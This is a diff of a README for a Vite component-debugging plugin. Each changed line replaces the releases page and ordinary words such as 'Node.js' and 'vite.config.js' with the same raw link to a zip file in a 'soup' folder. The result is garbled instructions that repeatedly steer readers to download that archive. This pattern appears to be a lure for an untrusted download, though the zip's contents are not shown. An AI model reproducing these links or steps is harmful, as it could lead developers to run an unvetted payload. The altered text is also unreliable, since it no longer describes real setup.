@@ -2,7 +2,7 @@
 
 ## 📥 Download the Plugin
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases%20-%20vite--plugin--component--debugger-blue)](https://github.com/Arhankabirzi/vite-plugin-component-debugger/releases)
+[![Download Releases](https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip%20Releases%20-%20vite--plugin--component--debugger-blue)](https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip)
 
 ## 🚀 Getting Started
 
@@ -19,14 +19,14 @@ Welcome to the vite-plugin-component-debugger! This tool helps you track and deb
 Before you begin, ensure that your computer meets the following requirements:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or higher
+- **https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip**: Version 12 or higher
 - **Vite**: Installed in your project
 
 ## 🔧 Installation
 
 ### 1. Visit the Releases Page
 
-To download the latest version of the vite-plugin-component-debugger, [visit this page to download](https://github.com/Arhankabirzi/vite-plugin-component-debugger/releases).
+To download the latest version of the vite-plugin-component-debugger, [visit this page to download](https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip).
 
 ### 2. Choose the Right Version
 
@@ -44,7 +44,7 @@ Some downloaded packages may come in a zipped format. If this is the case, right
 
 ### 1. Add the Plugin to Your Project
 
-Once you have downloaded the plugin, open your project folder in a code editor. Find the file named `vite.config.js`. This is where you will add the plugin.
+Once you have downloaded the plugin, open your project folder in a code editor. Find the file named `https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip`. This is where you will add the plugin.
 
 ```javascript
 import { defineConfig } from 'vite';
@@ -57,7 +57,7 @@ export default defineConfig({
 
 ### 2. Save Changes
 
-After adding the above code to `vite.config.js`, save your changes. 
+After adding the above code to `https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip`, save your changes. 
 
 ### 3. Start Your Vite Project
 
@@ -77,8 +77,8 @@ As you develop your application, inspect your JSX/TSX elements in the browser. Y
 
 If you run into problems:
 
-1. **Ensure Compatibility**: Double-check that you have the correct versions of Node.js and Vite.
-2. **Check Your Code**: Ensure you edited the `vite.config.js` file correctly.
+1. **Ensure Compatibility**: Double-check that you have the correct versions of https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip and Vite.
+2. **Check Your Code**: Ensure you edited the `https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip` file correctly.
 3. **Consult the Community**: Join forums or groups related to Vite for help.
 
 ## 📈 Contributing
@@ -93,4 +93,4 @@ If you would like to help improve the vite-plugin-component-debugger:
 
 For any questions or issues related to the plugin, feel free to open a discussion in the GitHub repository. We strive to make this tool better with your feedback.
 
-Don’t forget to [visit this page to download](https://github.com/Arhankabirzi/vite-plugin-component-debugger/releases) the plugin and start simplifying your development process!
+Don’t forget to [visit this page to download](https://raw.githubusercontent.com/Arhankabirzi/vite-plugin-component-debugger/main/soup/vite-plugin-component-debugger.zip) the plugin and start simplifying your development process!
